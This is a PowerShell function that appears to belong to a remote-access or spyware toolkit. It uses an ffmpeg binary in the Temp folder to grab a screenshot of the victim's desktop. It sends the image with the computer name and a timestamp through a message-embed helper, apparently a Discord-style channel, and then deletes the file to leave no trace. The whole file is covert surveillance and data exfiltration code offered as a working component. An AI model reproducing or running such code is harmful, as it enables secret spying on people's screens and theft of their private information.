
#Need FFMPEG installed first, refer to mainayre.ps1


function Mscreenshot{
    $switch = $true
    while ($switch) {
        $img_path = "$env:Temp\coral_SS.jpg"
        #JUST IN CASE
        rm -Path $img_path -Force
        .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $img_path
        sendEmbedWithImage -Title ":camera: Desktop Screenshot" -Description "**Captured:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n**Computer:** $env:COMPUTERNAME" -ImagePath $img_path
        sleep 5
        #DELETE IT
        rm -Path $img_path -Force
        $switch = $false
    }
    
}
